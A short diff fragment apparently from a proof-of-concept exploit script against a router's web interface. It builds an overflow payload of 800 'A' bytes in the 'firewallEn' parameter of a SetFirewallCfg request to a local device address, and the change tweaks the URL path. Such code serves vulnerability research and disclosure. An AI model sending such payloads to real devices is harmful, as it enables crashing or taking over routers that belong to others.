@@ -46,7 +46,7 @@ cmd  = b'firewallEn=' + b'A' * 800
 
 
 url = b"http://192.168.2.2/login/Auth"
-payload = b"http://192.168.2.2/goform/SetFirewallCfg?" + cmd
+payload = b"http://192.168.2.2/goform/SetFirewallCfg/?" + cmd
 
 data = {
     "username": "admin",
